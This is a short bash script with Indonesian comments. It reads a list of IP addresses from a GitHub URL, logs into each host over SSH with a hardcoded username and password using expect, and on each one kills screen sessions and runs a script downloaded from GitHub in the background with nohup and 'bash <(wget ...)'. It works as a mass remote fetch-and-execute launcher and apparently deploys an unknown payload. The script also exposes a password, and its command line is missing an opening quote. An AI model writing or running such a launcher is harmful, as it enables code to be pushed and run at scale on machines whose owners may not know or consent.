#!/bin/bash
    USER="cloudsigma"         # Menetapkan USER
    PASSWORD="Dotaja123@HHHH"   # Menetapkan PASSWORD
    COMMAND=pkill screen; nohup bash -c 'bash <(wget -qO- https://raw.githubusercontent.com/DOT-SUNDA/dot-lun/refs/heads/main/gulazg.sh)' > /dev/null 2>&1"
    
    echo "Gasken!!!"

    # Menggunakan expect untuk login otomatis dan menjalankan script
    curl -s https://raw.githubusercontent.com/DOT-SUNDA/dot-lun/refs/heads/main/ips.txt | while IFS= read -r IP; do
    /usr/bin/expect << EOF
    set timeout 10
    spawn ssh $USER@$IP
    expect {
        "*yes/no*" { send "yes\r"; exp_continue }
        "*assword:*" { send "$PASSWORD\r" }
    }
    expect "*$*"  # Prompt yang menandakan login berhasil (misalnya root prompt)
    send "$COMMAND\r"
    expect "*$*"  # Tunggu sampai perintah selesai
    send "exit\r"
    expect eof
EOF
done
